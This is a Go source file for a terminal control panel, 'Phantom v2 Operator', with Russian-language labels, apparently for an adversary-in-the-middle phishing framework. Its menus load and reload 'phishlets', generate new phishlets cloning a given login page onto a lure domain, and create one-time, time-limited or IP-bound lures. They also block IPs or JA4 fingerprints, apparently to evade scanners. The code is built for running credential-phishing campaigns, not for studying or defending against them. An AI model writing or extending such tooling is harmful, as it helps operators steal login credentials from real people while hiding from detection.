// TUI на bubbletea: главное меню + экраны dashboard/phishlets/block/lure/reload/generate.
package menu

import (
	"fmt"
	"strings"

	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

var (
	titleStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("63"))
	okStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("42"))
	errStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dimStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("241"))
)

type screen int

const (
	sMenu screen = iota
	sDashboard
	sPhishlets
	sBlock
	sLure
	sReload
	sGenerate
	sResult
)

type item struct {
	title, desc string
	goes  screen
}

func (i item) Title() string       { return i.title }
func (i item) Description() string { return i.desc }
func (i item) FilterValue() string { return i.title }

type model struct {
	client *Client
	screen screen
	list   list.Model
	inputs []textinput.Model
	focus  int
	result string
	isErr  bool
	back   screen
}

func initialModel(c *Client) model {
	items := []list.Item{
		item{"Dashboard", "stats + node + uptime", sDashboard},
		item{"Phishlets", "список загруженных", sPhishlets},
		item{"Block IP", "забанить IP/JA4", sBlock},
		item{"Smart lure+", "одноразовая приманка", sLure},
		item{"Reload", "hot-reload фишлетов", sReload},
		item{"Generate", "сгенерировать фишлет", sGenerate},
		item{"Quit", "выход (сервер продолжает работать)", sMenu},
	}
	l := list.New(items, list.NewDefaultDelegate(), 52, 16)
	l.Title = "Phantom v2 Operator"
	l.SetShowStatusBar(false)
	return model{client: c, screen: sMenu, list: l}
}

func mkInputs(placeholders []string) []textinput.Model {
	out := make([]textinput.Model, len(placeholders))
	for i, p := range placeholders {
		ti := textinput.New()
		ti.Placeholder = p
		if i == 0 {
			ti.Focus()
		}
		out[i] = ti
	}
	return out
}

// Run запускает TUI. Возвращает управление после Quit.
func Run(c *Client) error {
	p := tea.NewProgram(initialModel(c))
	_, err := p.Run()
	return err
}

func (m model) Init() tea.Cmd { return nil }

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			return m, tea.Quit
		case "esc":
			if m.screen != sMenu {
				m.screen = sMenu
				return m, nil
			}
		case "enter":
			return m.onEnter()
		case "tab", "shift+tab", "up", "down":
			if m.screen == sBlock || m.screen == sLure || m.screen == sGenerate {
				return m.moveFocus(msg.String())
			}
		}
	}
	var cmd tea.Cmd
	switch m.screen {
	case sMenu:
		m.list, cmd = m.list.Update(msg)
		return m, cmd
	default:
		if m.screen == sBlock || m.screen == sLure || m.screen == sGenerate {
			for i := range m.inputs {
				if i == m.focus {
					m.inputs[i], cmd = m.inputs[i].Update(msg)
					return m, cmd
				}
			}
		}
	}
	return m, nil
}

func (m model) moveFocus(key string) (tea.Model, tea.Cmd) {
	m.inputs[m.focus].Blur()
	switch key {
	case "tab", "down":
		m.focus = (m.focus + 1) % len(m.inputs)
	case "shift+tab", "up":
		m.focus = (m.focus - 1 + len(m.inputs)) % len(m.inputs)
	}
	m.inputs[m.focus].Focus()
	return m, nil
}

func (m model) onEnter() (tea.Model, tea.Cmd) {
	if m.screen == sMenu {
		sel, ok := m.list.SelectedItem().(item)
		if !ok {
			return m, nil
		}
		if sel.title == "Quit" {
			return m, tea.Quit
		}
		m.screen = sel.goes
		m.result, m.isErr = "", false
		switch sel.goes {
		case sDashboard:
			st, err := m.client.Stats()
			if err != nil {
				return m.showResult("stats: "+err.Error(), true), nil
			}
			ph, _ := m.client.Phishlets()
			return m.showResult(fmt.Sprintf("node=%v phishlets=%v uptime=%vs\nloaded: %s",
				st["node"], st["phishlets"], st["uptime_s"], strings.Join(ph, ", ")), false), nil
		case sPhishlets:
			ph, err := m.client.Phishlets()
			if err != nil {
				return m.showResult("phishlets: "+err.Error(), true), nil
			}
			return m.showResult("loaded:\n- "+strings.Join(ph, "\n- "), false), nil
		case sBlock:
			m.inputs = mkInputs([]string{"IP или JA4", "причина"})
			m.focus = 0
		case sLure:
			m.inputs = mkInputs([]string{"path /l/xxx", "phishlet id", "ttl мин (0=∞)", "max uses (1=однораз)", "bound ip (пусто=любой)"})
			m.focus = 0
		case sReload:
			if err := m.client.Reload(); err != nil {
				return m.showResult("reload: "+err.Error(), true), nil
			}
			return m.showResult("reloaded ok", false), nil
		case sGenerate:
			m.inputs = mkInputs([]string{"origin login.x.com", "domain p.test", "id"})
			m.focus = 0
		}
		return m, nil
	}
	// Submit форм.
	switch m.screen {
	case sBlock:
		if m.inputs[0].Value() == "" {
			return m.showResult("нужен IP/JA4", true), nil
		}
		if err := m.client.Block(m.inputs[0].Value(), m.inputs[1].Value()); err != nil {
			return m.showResult("block: "+err.Error(), true), nil
		}
		return m.showResult("blocked "+m.inputs[0].Value(), false), nil
	case sLure:
		ttl, uses := atoi(m.inputs[2].Value()), atoi(m.inputs[3].Value())
		if err := m.client.SmartLure(m.inputs[0].Value(), m.inputs[1].Value(), ttl, uses, m.inputs[4].Value(), false); err != nil {
			return m.showResult("lure: "+err.Error(), true), nil
		}
		return m.showResult("lure создан: "+m.inputs[0].Value(), false), nil
	case sGenerate:
		yml, err := m.client.Generate(m.inputs[0].Value(), m.inputs[1].Value(), m.inputs[2].Value())
		if err != nil {
			return m.showResult("generate: "+err.Error(), true), nil
		}
		lines := strings.SplitN(yml, "\n", 12)
		return m.showResult(strings.Join(lines, "\n")+"\n...", false), nil
	}
	return m, nil
}

func (m model) showResult(s string, isErr bool) model {
	m.screen, m.result, m.isErr, m.back = sResult, s, isErr, m.screen
	if m.back == sResult {
		m.back = sMenu
	}
	return m
}

func atoi(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func (m model) View() string {
	head := titleStyle.Render("◆ Phantom v2") + dimStyle.Render("  esc=назад  tab=поле  enter=ok  ctrl+c=выход") + "\n\n"
	switch m.screen {
	case sMenu:
		return head + m.list.View()
	case sResult:
		st := okStyle.Render("OK")
		if m.isErr {
			st = errStyle.Render("ERR")
		}
		return head + st + "\n" + m.result + dimStyle.Render("\n\nesc — назад")
	case sBlock, sLure, sGenerate:
		var b strings.Builder
		b.WriteString(head)
		for _, in := range m.inputs {
			b.WriteString(in.View() + "\n")
		}
		b.WriteString(dimStyle.Render("\nenter — выполнить"))
		return b.String()
	default:
		return head
	}
}
